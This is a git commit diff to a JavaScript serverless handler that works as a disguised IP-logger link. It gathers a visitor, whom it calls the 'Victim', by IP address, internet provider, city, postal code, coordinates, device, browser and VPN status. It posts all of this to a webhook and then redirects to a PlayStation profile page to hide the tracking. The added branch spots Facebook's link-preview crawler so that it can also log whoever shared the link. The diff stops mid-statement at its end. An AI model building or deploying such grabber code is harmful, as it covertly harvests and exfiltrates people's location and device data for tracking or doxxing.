52928e5b50aac2b9cbdb0b88e697168d5fcd4b29
Yizfe <43157705+Elocojr99@users.noreply.github.com>
2024-12-16 18:39:22 -0800

    Update LB7.mjs
    rg

--- api/LB7.mjs
+++ api/LB7.mjs
@@ -96,47 +96,58 @@ export default async function handler(req, res) {
                     }
                 ]
             }
-            : {
-                embeds: [
-                    {
-                        title: "User Opened Link",
-                        color: 0x00FFFF,
-                        description: "Device info collected from Victim.",
-                        fields: [
-                            { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
-                            { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
-                            { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
-                            { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
-                            { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
-                            { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
-                            { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
-                            { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
-                            { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
-                            { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
-                            { name: "Coords", value: coords, inline: true },
-                            { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
-                            { name: "Device Info", value: `\`${userAgent}\``, inline: false },
-                            { name: "Device Type", value: `\`${deviceType}\``, inline: true },
-                            { name: "Operating System", value: `\`${os}\``, inline: true },
-                            { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
-                            { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
-                            { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
-                            { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
-                            { name: "Referer", value: `\`${referer}\``, inline: false },
-                            { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
-                            { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                            { name: "Hosting", value: `\`No\``, inline: true }
-                        ]
-                    }
-                ]
-            };
+            : ipDetails.isp === "Facebook" && userAgent.includes("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)")
+                ? {
+                    embeds: [
+                        {
+                            title: "User Send Link To Victim",
+                            color: 0xFF0000, // Red color to indicate alert
+                            description: "Device info collected from sender.",
+                            fields: [
+                                { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                                { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                                { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                            ]
+                        }
+                    ]
+                }
+                : {
+                    embeds: [
+                        {
+                            title: "User Opened Link",
+                            color: 0x00FFFF,
+                            description: "Device info collected from Victim.",
+                            fields: [
+                                { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+                                { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+                                { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+                                { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+                                { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
+                                { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+                                { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+                                { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+                                { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
+                                { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
+                                { name: "Coords", value: coords, inline: true },
+                                { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
+                                { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+                                { name: "Device Type", value: `\`${deviceType}\``, inline: true },
+                                { name: "Operating System", value: `\`${os}\``, inline: true },
+                                { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
+                                { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+                                { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
+                                { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+                                { name: "Referer", value: `\`${referer}\``, inline: false },
+                                { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+                                { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+                                { name: "Hosting", value: `\`No\``, inline: true }
+                            ]
+                        }
+                    ]
+                };
 
-        // Send the message to the webhook
         await sendToWebhook(message);
-        
         res.writeHead(302, { Location: 'https://profile.playstation.com/LB7' });
         res.end();
     } else {
-        res.status(405).send("Method Not Allowed");
-    }
-}
+        res.status(405).
